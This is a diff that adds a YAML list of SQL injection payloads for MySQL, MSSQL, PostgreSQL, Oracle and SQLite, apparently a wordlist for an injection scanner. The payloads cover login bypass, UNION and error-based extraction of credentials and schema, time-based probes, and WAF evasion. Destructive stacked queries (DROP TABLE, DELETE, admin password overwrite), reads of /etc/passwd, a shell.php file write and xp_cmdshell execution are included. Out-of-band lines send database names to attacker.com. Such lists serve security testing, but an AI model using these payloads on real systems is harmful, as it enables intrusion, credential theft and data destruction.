@@ -1,0 +1,249 @@
+mysql:
+  auth_bypass:
+  - ''' OR ''1''=''1'
+  - ''' OR ''1''=''1''--'
+  - ''' OR ''1''=''1''#'
+  - ''' OR ''1''=''1''/*'
+  - ''' OR 1=1--'
+  - ''' OR 1=1#'
+  - ''' OR 1=1/*'
+  - ''') OR ''1''=''1'
+  - ''') OR (''1''=''1'
+  - admin'--
+  - admin'#
+  - admin'/*
+  - admin' OR '1'='1
+  - admin' OR '1'='1'--
+  - admin') OR ('1'='1'--
+  - ''') OR ''1''=''1''--'
+  - ''' OR ''''='''
+  - ''' OR ''x''=''x'
+  - ''' OR 1--'
+  - ''' OR 1#'
+  - or 1=1
+  - or 1=1--
+  - ''' or ''''-'''
+  - ''' or '''' '''
+  - ''' or ''''&'''
+  - ''' or ''''^'''
+  - ''' or ''''*'''
+  - or true--
+  - ''') or true--'
+  - admin' or 1=1--
+  - admin' or '1'='1'--
+  - 1' or '1'='1
+  - 1 or 1=1
+  - ''' OR ''a''=''a'
+  - ''') OR (''a''=''a'
+  - ''') OR (''a''=''a''--'
+  - ''' OR ''a''=''a''--'
+  - ''' OR ''a''=''a''#'
+  - ''' OR 1 LIKE 1'
+  - ''' OR 1=1 LIMIT 1--'
+  - 1' OR '1'='1'/*
+  union_select:
+  - ''' UNION SELECT NULL--'
+  - ''' UNION SELECT NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
+  - ''' UNION SELECT 1--'
+  - ''' UNION SELECT 1,2--'
+  - ''' UNION SELECT 1,2,3--'
+  - ''' UNION SELECT 1,2,3,4--'
+  - ''' UNION SELECT 1,2,3,4,5--'
+  - ''' UNION SELECT 1,2,3,4,5,6--'
+  - ''' UNION SELECT 1,2,3,4,5,6,7--'
+  - ''' UNION SELECT 1,2,3,4,5,6,7,8--'
+  - ''' UNION SELECT 1,2,3,4,5,6,7,8,9--'
+  - ''' UNION SELECT 1,2,3,4,5,6,7,8,9,10--'
+  - ''' UNION ALL SELECT NULL--'
+  - ''' UNION ALL SELECT NULL,NULL--'
+  - ''' UNION ALL SELECT 1,2,3--'
+  - ''' UNION ALL SELECT 1,2,3,4,5--'
+  - -1' UNION SELECT 1,2,3--
+  - 0' UNION SELECT 1,2,3--
+  - 1' UNION SELECT 1,2,3--
+  - 99999' UNION SELECT 1,2,3--
+  - ''' UNION SELECT @@version--'
+  - ''' UNION SELECT user()--'
+  - ''' UNION SELECT database()--'
+  - ''' UNION SELECT schema_name FROM information_schema.schemata--'
+  - ''' UNION SELECT table_name FROM information_schema.tables--'
+  - ''' UNION SELECT column_name FROM information_schema.columns--'
+  - ''' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--'
+  - ''' UNION SELECT CONCAT(username,0x3a,password) FROM users--'
+  - ''' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--'
+  - ''' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=''users''--'
+  - ''' UNION SELECT LOAD_FILE(''/etc/passwd'')--'
+  error_based:
+  - ''' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--'
+  - ''' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--'
+  - ''' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--'
+  - ''' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--'
+  - ''' AND exp(~(SELECT * FROM (SELECT database())a))--'
+  - ''' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database())),1)--'
+  - ''' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database())) USING utf8)))--'
+  - ''' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--'
+  - ''' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--'
+  - ''' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--'
+  - ''' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--'
+  - ''' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--'
+  - ''' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP
+    BY x)a)--'
+  time_based:
+  - ''' AND SLEEP(5)--'
+  - ''' AND SLEEP(5)#'
+  - '''; SELECT SLEEP(5)--'
+  - ''' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--'
+  - ''' AND IF(1=1,SLEEP(5),0)--'
+  - ''' AND IF(1=2,SLEEP(5),0)--'
+  - ''' OR SLEEP(5)--'
+  - ''' OR SLEEP(5)#'
+  - 1' AND BENCHMARK(5000000,SHA1('test'))--
+  - ''' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--'
+  - ''' AND SLEEP(5) AND ''1''=''1'
+  - ''') AND SLEEP(5) AND (''1''=''1'
+  - 1' AND SLEEP(5) AND '1'='1
+  - 1') AND SLEEP(5) AND ('1'='1
+  - ''' OR IF(1=1,SLEEP(5),0)--'
+  - ''' AND IF(1=1,BENCHMARK(5000000,MD5(''a'')),0)--'
+  - ''' RLIKE SLEEP(5)--'
+  - ''' OR 1=1 AND SLEEP(5)--'
+  - ''';WAITFOR DELAY ''0:0:5''--'
+  - ''');WAITFOR DELAY ''0:0:5''--'
+  stacked:
+  - '''; DROP TABLE users--'
+  - '''; INSERT INTO users VALUES(''hack'',''hack'')--'
+  - '''; UPDATE users SET password=''hacked'' WHERE username=''admin''--'
+  - '''; DELETE FROM users--'
+  - '''; CREATE TABLE hack(data varchar(100))--'
+  - '''; SELECT * INTO OUTFILE ''/tmp/test.txt''--'
+  - '''; SELECT * INTO DUMPFILE ''/tmp/shell.php''--'
+  waf_bypass:
+  - ''' /*!50000OR*/ ''1''=''1'
+  - ''' %00OR ''1''=''1'
+  - ''' OR/**/1=1--'
+  - ''' UN/**/ION SE/**/LECT 1,2,3--'
+  - ''' UNION%0ASELECT%0A1,2,3--'
+  - ''' /*!UNION*/ /*!SELECT*/ 1,2,3--'
+  - '''+OR+1=1--'
+  - '''%20OR%201=1--'
+  - ''' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--'
+  - ''' oR ''1''=''1'
+  - ''' Or ''1''=''1'
+  - ''' OR%0A1=1--'
+  - ''' OR%0D%0A1=1--'
+  - ''' OR%091=1--'
+  - 1'%20or%20'1'='1
+  - 1'%0Aor%0A'1'='1
+  - 1'/**/or/**/'1'='1
+  - ''' UniOn SeLeCt 1,2,3--'
+  - ''' uNiOn sElEcT 1,2,3--'
+  - ''' %55nion %53elect 1,2,3--'
+  - ''' u]nion [se]lect 1,2,3--'
+  - ''' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--'
+  - '''||''1'
+  - '''## || ''1'
+  - '''=''1'
+  - '''+OR+''1'
+  - '''OR+''1'
+  - ''' AND 1=1 UNION SELECT 1,2,3--'
+  - ''' AND 0 UNION SELECT 1,2,3--'
+  - ''' AnD ''1''=''1'
+  - ''' aNd ''1''=''1'
+  - '''%20AND%20''1''=''1'
+  - '''-1'' UNION SELECT 1,2,3--'
+  - '''%2d1'' UNION SELECT 1,2,3--'
+  - ''' having 1=1--'
+  - ''' group by 1--'
+  - ''' order by 1--'
+  - ''' %26%26 1=1--'
+  - ''' && 1=1--'
+  out_of_band:
+  - ''' AND LOAD_FILE(CONCAT(''\\\\'',database(),''.attacker.com\\a''))--'
+  - ''' AND (SELECT * FROM (SELECT CONCAT(''\\\\'',database(),''.attacker.com\\a''))a)--'
+mssql:
+  auth_bypass:
+  - ''' OR ''1''=''1'
+  - ''' OR ''1''=''1''--'
+  - ''') OR ''1''=''1''--'
+  - admin'--
+  - ''' OR 1=1--'
+  - ''' OR 1=1 /*'
+  - ''') OR (''1''=''1'
+  - ''' OR ''a''=''a'
+  union_select:
+  - ''' UNION SELECT NULL--'
+  - ''' UNION SELECT NULL,NULL--'
+  - ''' UNION SELECT NULL,NULL,NULL--'
+  - ''' UNION SELECT @@version--'
+  - ''' UNION SELECT name FROM master..sysdatabases--'
+  - ''' UNION SELECT name FROM sysobjects WHERE xtype=''U''--'
+  - ''' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name=''users'')--'
+  error_based:
+  - ''' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--'
+  - ''' AND 1=CONVERT(int,(SELECT @@version))--'
+  - ''' AND 1=CONVERT(int,db_name())--'
+  time_based:
+  - '''; WAITFOR DELAY ''0:0:5''--'
+  - '''); WAITFOR DELAY ''0:0:5''--'
+  - '''; IF 1=1 WAITFOR DELAY ''0:0:5''--'
+  - '''; IF 1=2 WAITFOR DELAY ''0:0:5''--'
+  stacked:
+  - '''; EXEC xp_cmdshell(''whoami'')--'
+  - '''; EXEC sp_configure ''show advanced options'',1--'
+  - '''; EXEC sp_configure ''xp_cmdshell'',1--'
+  - '''; RECONFIGURE--'
+  - '''; EXEC master..xp_cmdshell ''ping attacker.com''--'
+postgresql:
+  auth_bypass:
+  - ''' OR ''1''=''1'
+  - ''' OR ''1''=''1''--'
+  - ''' OR 1=1--'
+  union_select:
+  - ''' UNION SELECT NULL--'
+  - ''' UNION SELECT version()--'
+  - ''' UNION SELECT current_database()--'
+  - ''' UNION SELECT current_user--'
+  - ''' UNION SELECT table_name FROM information_schema.tables--'
+  time_based:
+  - '''; SELECT pg_sleep(5)--'
+  - ''' AND pg_sleep(5)--'
+  - ''' OR pg_sleep(5)--'
+  - '''; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--'
+  stacked:
+  - '''; CREATE TABLE hack(data text)--'
+  - '''; COPY hack FROM ''/etc/passwd''--'
+  - '''; DROP TABLE hack--'
+oracle:
+  auth_bypass:
+  - ''' OR ''1''=''1'
+  - ''' OR 1=1--'
+  - ''') OR (''1''=''1'
+  union_select:
+  - ''' UNION SELECT NULL FROM DUAL--'
+  - ''' UNION SELECT banner FROM v$version--'
+  - ''' UNION SELECT user FROM dual--'
+  - ''' UNION SELECT table_name FROM all_tables--'
+  time_based:
+  - ''' AND DBMS_PIPE.RECEIVE_MESSAGE(''a'',5)--'
+  - ''' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(''a'',5)--'
+  out_of_band:
+  - ''' AND UTL_HTTP.REQUEST(''http://attacker.com/''||user)--'
+  - ''' AND UTL_INADDR.GET_HOST_ADDRESS(''attacker.com'')--'
+sqlite:
+  auth_bypass:
+  - ''' OR ''1''=''1'
+  - ''' OR 1=1--'
+  - ''' OR 1--'
+  union_select:
+  - ''' UNION SELECT NULL--'
+  - ''' UNION SELECT sqlite_version()--'
+  - ''' UNION SELECT name FROM sqlite_master--'
+  - ''' UNION SELECT sql FROM sqlite_master--'
